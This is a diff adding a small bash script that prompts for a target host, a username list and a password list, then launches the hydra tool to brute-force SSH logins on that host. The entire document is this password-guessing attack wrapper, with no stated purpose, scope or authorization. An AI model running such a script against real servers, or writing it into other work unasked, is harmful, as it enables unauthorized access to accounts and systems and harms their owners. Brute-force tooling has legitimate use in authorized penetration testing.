@@ -1,0 +1,11 @@
+#!/bin/bash
+
+echo -n "Target: ~$ "
+read host
+echo -n "Userlist: ~$ "
+read users
+echo -n "Passlist: ~$ "
+read passwd
+
+sudo hydra -S -L $users -P $passwd $host ssh
+
